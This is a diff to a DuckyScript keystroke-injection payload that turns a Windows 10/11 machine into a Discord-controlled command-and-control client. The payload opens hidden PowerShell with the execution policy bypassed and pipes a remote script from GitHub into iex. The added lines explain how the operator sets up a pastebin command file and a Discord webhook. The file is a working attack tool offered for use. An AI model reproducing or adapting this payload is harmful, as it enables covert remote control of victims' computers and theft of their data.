@@ -4,6 +4,14 @@ REM Author: @beigeworm
 REM Description: Using a Discord Server Chat and a github text file to Act as a Command and Control Platform.
 REM Target: Windows 10 and 11
 
+REM SETUP
+REM Goto https://pastebin.com and make an account..
+REM Create an empty paste/file and copy the RAW url.
+REM Change PASTEBIN_URL_HERE to the RAW url  eg. https://pastebin.com/raw/QeCLTdea -OR- http://your.server.ip.here/files/file.txt 
+REM Change WEBHOOK_HERE to your webhook eg. https://discord.com/api/webhooks/123445623531/f4fw3f4r46r44343t5gxxxxxx
+
+REM for more info goto - https://github.com/beigeworm/PoshCord-C2
+
 REM some setup for dukie script
 DEFAULT_DELAY 100
 
@@ -14,7 +22,7 @@ DELAY 750
 STRING powershell -NoP -Ep Bypass -W H
 ENTER
 DELAY 5000
-STRING $hookurl = 'WEBHOOK_HERE'; $ghurl = 'GITHUB_URL_HERE'; 
+STRING $hookurl = 'WEBHOOK_HERE'; $ghurl = 'PASTEBIN_URL_HERE'; 
 STRING irm https://raw.githubusercontent.com/beigeworm/PoshCord-C2/main/Discord-C2-Client.ps1 | iex
 ENTER
 
